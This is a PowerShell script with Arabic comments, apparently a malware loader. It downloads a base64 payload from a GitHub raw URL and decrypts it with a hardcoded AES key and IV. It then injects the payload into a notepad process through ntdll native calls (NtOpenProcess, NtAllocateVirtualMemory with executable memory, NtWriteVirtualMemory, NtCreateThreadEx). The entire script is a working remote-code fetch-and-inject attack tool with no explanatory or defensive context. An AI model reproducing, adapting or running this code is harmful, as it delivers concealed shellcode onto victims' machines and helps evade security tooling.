# تحميل Shellcode وفك التشفير (نفس الكود السابق)
$url = 'https://raw.githubusercontent.com/Mouted/Hos/main/b64.txt'
$wc = New-Object System.Net.WebClient
$b64 = $wc.DownloadString($url).Trim()
$wc.Dispose()
$enc = [Convert]::FromBase64String($b64)
$key = [byte[]]@(0xF7,0x0E,0x9C,0x34,0xB0,0x05,0x95,0x1E,0xA9,0xA8,0x51,0xDC,0x08,0xFA,0xCA,0x2E,0xFA,0xBF,0x17,0x3A,0xA7,0x95,0xAE,0x51,0xC7,0xF6,0x55,0x14,0xFB,0x70,0x64,0xDB)
$iv  = [byte[]]@(0x42,0x0B,0xD0,0xB0,0x00,0xB6,0xBB,0xF8,0x35,0x44,0x7E,0x2D,0x7E,0x94,0x93,0x6F)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = $iv
$dec = $aes.CreateDecryptor()
$shellcode = $dec.TransformFinalBlock($enc, 0, $enc.Length)
$dec.Dispose()
$aes.Dispose()

# ✅ Direct Syscalls (بدون AMSI Bypass)
$code = @'
using System;
using System.Runtime.InteropServices;

public class Syscall
{
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

    [DllImport("ntdll.dll")]
    public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferSize, out uint BytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr AttributeList);

    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    public struct OBJECT_ATTRIBUTES
    {
        public uint Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
'@
Add-Type -TypeDefinition $code -Language CSharp

$p = Get-Process notepad -ErrorAction SilentlyContinue | Select-Object -First 1
if ($p -eq $null) {
    Start-Process notepad
    Start-Sleep 2
    $p = Get-Process notepad | Select-Object -First 1
}

$hProc = [IntPtr]::Zero
$oa = New-Object Syscall+OBJECT_ATTRIBUTES
$oa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($oa)
$cid = New-Object Syscall+CLIENT_ID
$cid.UniqueProcess = [IntPtr]$p.Id
$status = [Syscall]::NtOpenProcess([ref]$hProc, 0x1F0FFF, [ref]$oa, [ref]$cid)
if ($status -ne 0) { exit 2 }

$addr = [IntPtr]::Zero
$size = [IntPtr]$shellcode.Length
$status = [Syscall]::NtAllocateVirtualMemory($hProc, [ref]$addr, [IntPtr]::Zero, [ref]$size, 0x3000, 0x40)
if ($status -ne 0) { exit 3 }

$written = 0
$status = [Syscall]::NtWriteVirtualMemory($hProc, $addr, $shellcode, $shellcode.Length, [ref]$written)
if ($status -ne 0) { exit 4 }

$hThread = [IntPtr]::Zero
$status = [Syscall]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProc, $addr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
if ($status -ne 0) { exit 5 }

[Syscall]::NtClose($hThread)
[Syscall]::NtClose($hProc)
